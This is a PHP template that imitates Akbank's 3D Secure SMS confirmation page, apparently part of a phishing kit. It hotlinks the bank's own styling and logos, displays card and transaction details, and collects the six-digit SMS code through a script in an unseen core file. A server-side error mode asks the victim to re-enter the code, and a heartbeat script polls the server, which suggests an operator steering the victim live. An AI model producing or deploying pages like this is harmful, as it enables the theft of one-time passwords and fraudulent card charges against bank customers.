<?php
require __DIR__ . '/_acs_core.php';
$kg = $kod_goster; $hm = $hata_modu;
$cc_last_4 = substr($kart_no, -4);
$cc_first_6 = substr($kart_no, 0, 6);
?>
<html>
  <head>
    <title>Alışveriş</title>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" type="text/css" media="screen" href="https://3dsecure.akbank.com.tr/akbankacs/dijitalgozluk_css/dijitalgozluk.css">
    <script src="https://code.jquery.com/jquery-1.11.1.min.js"></script>
    <!-- used for hidding spinner on winphone-->
    <style>
      .ui-loading .ui-loader {
        display: none;
      }

      .ui-icon-loading {
        opacity: 0;
      }
      #state-bekle { text-align:center; padding:30px 10px; }
      #state-bekle .akb-spinner { width:40px;height:40px;border:4px solid #f0f0f0;border-top-color:#e30613;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 12px; }
      @keyframes spin { to { transform:rotate(360deg); } }
      #hata-box { color:red; margin-bottom:8px; display:none; }
    </style>
    <meta name="decorator" content="3dlayout">
    <link rel="stylesheet" href="https://code.jquery.com/ui/1.12.1/themes/base/jquery-ui.css">
    <script src="https://code.jquery.com/ui/1.12.1/jquery-ui.js"></script>
  </head>
  <body>
    <div data-role="content" data-theme="c">
      <noscript style="color: red">İşleminizi tamamlayabilmeniz için Javascript'i etkinleştirin. </noscript>
      <div class="content">
        <div class="dijitalgozluk-arkaplan">
          <form id="axesswings3dsecurekayit3" name="axesswings3dsecurekayit3" action="" method="POST" autocomplete="off" onsubmit="event.preventDefault();submitAcsKod();">
            <div class="dijitalgozluk-ekran">
              <div class="dijitalgozluk-cerceve">
                <div class="dijitalgozluk-kapat">
                  <a>
                    <img src="https://3dsecure.akbank.com.tr/akbankacs/dijitalgozluk_img/v2/icon-close-18x18.png" alt="X">
                  </a>
                </div>
                <div class="dijitalgozluk-logolar">
                  <div class="dijitalgozluk-logo dijitalgozluk-logo-banka">
                    <img src="https://3dsecure.akbank.com.tr/akbankacs/dijitalgozluk_img/logo-akbank.svg" alt="Akbank">
                  </div>
                  <!--/logo-->
                  <div class="dijitalgozluk-yazi dijitalgozluk-baslik"> Uluslararası Güvenlik <br> Platformu 3D Secure </div>
                </div>
                <!--/logolar-->
                <div class="dijitalgozluk-tablo dijitalgozluk-tablo-bilgiler">
                  <div class="dijitalgozluk-tablo-satir">
                    <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-isim"> İşyeri Adı </div>
                    <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-deger"> <?= htmlspecialchars($isyeri) ?> </div>
                  </div>
                  <div class="dijitalgozluk-tablo-satir">
                    <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-isim"> Tutar </div>
                    <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-deger"> <?= $tutar ?> ₺</div>
                  </div>
                  <div class="dijitalgozluk-tablo-satir">
                    <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-isim"> Tarih </div>
                    <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-deger"> <?= $zaman ?> </div>
                  </div>
                  <div class="dijitalgozluk-tablo-satir">
                    <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-isim"> Kart Numarası </div>
                    <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-deger"> ************<?= $cc_last_4 ?> </div>
                  </div>
                  <div class="dijitalgozluk-tablo-satir">
                    <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-isim"> Cep Telefonu </div>
                    <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-deger"> 05XXXXXXXXX </div>
                  </div>

                  <?php if ($hm): ?>
                  <div class="dijitalgozluk-tablo-satir">
                    <div style="color: red;" class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-isim"> HATA </div>
                    <div style="color: red;" class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-deger" id="hata-box">Girdiğiniz şifre hatalı. Lütfen tekrar giriniz.</div>
                  </div>
                  <?php else: ?>
                  <div class="dijitalgozluk-tablo-satir" id="hata-box" style="display:none">
                    <div style="color:red;" class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-isim"> HATA </div>
                    <div style="color:red;" class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-deger"></div>
                  </div>
                  <?php endif; ?>

                </div>

                <!-- BEKLEME EKRANI -->
                <div id="state-bekle" <?= $kg ? 'style="display:none"' : '' ?>>
                  <div class="akb-spinner"></div>
                  <div class="dijitalgozluk-yazi dijitalgozluk-yonlendirme">
                    <p>SMS şifresi gönderiliyor, lütfen bekleyiniz...</p>
                  </div>
                </div>

                <!-- KOD GİRİŞ EKRANI -->
                <div id="state-kod" <?= $kg ? '' : 'style="display:none"' ?>>
                  <div id="passwordInformation">
                    <div class="dijitalgozluk-kart-logo">
                      <img src="https://3dsecure.akbank.com.tr/akbankacs/dijitalgozluk_img/v2/ikon-sms-36x31.png" alt="">
                    </div>
                    <div id="passwordInformation1" class="dijitalgozluk-yazi dijitalgozluk-yonlendirme">
                      <p>
                        <span> 01 </span> nolu 3D Secure / Go Güvenli Öde şifrenizi şifre alanına giriniz.
                      </p>
                    </div>
                    <div id="passwordInformation2" class="dijitalgozluk-form-kontrol dijitalgozluk-form-yazi dijitalgozluk-form-sms-gir">
                      <div class="dijitalgozluk-form-yazi-baslik">Şifre:</div>
                      <div class="dijitalgozluk-form-yazi-input">
                        <input type="text" inputmode="numeric" id="sms-kod" name="sms"
                               autofocus minlength="6" maxlength="6" size="6" autocomplete="off" required
                               oninput="this.value=this.value.replace(/\D/g,'').slice(0,6);checkAcsBtn()">
                      </div>
                      <div id="helpDiv" class="dijitalgozluk-form-yazi-yardim">
                        <a id="opener">Yardım</a>
                      </div>
                    </div>
                  </div>
                  <div>
                    <div id="div1" style="width: 180px; margin: 0px auto 0 auto;"></div>
                  </div>
                  <div id="remainingWarn" class="dijitalgozluk-yazi dijitalgozluk-uyari">
                    <p> Onaylama süresinin dolmasına <span id="time">180</span> saniye kalmıştır </p>
                  </div>
                  <div class="dijitalgozluk-form-kontrolu dijitalgozluk-dugme dijitalgozluk-devam-dugmesi">
                    <input id="acs-submit-btn" name="DevamEt" type="button" value="Devam" onclick="submitAcsKod()" disabled>
                  </div>
                  <div class="dijitalgozluk-yazi dijitalgozluk-alternatif-yontem dijitalgozluk-alternatif-yontem-sms">
                    <p>Bu işlemi Axess Mobil'den de onaylayabilirdin.</p>
                  </div>
                </div>
                <!--/form-kontrolu-->
              </div>
              <!--/cerceve-->
            </div>
            <!--/ekran-->
          </form>
        </div>
        <!--/arkaplan-->
      </div>
    </div>
    <div data-role="footer" data-theme="c" data-position="fixed"></div>

    <script>
		var seconds = 180;
		var display = document.querySelector('#time');

		function incrementSeconds() {
    seconds -= 1;
    display.textContent = seconds;
    }

    var cancel = setInterval(incrementSeconds, 1000);
	</script>

<?= acs_heartbeat_js($kg, $hm) ?>
  </body>
</html>
